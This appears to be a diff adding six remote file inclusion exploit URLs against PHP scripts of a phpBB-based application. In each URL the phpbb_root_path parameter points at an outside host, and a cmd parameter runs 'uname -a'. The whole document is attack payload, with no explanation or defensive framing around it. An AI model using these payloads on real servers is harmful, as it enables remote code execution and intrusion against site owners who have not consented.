@@ -1,0 +1,6 @@
+http://www.example.com/[foingpath]/index.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
+http://www.example.com/[foingpath]/song.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
+http://www.example.com/[foingpath]/faq.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
+http://www.example.com/[foingpath]/list.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
+http://www.example.com/[foingpath]/gen_m3u.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
+http://www.example.com/[foingpath]/playlist.php?phpbb_root_path=http://www.example.com?&amp;cmd=uname -a
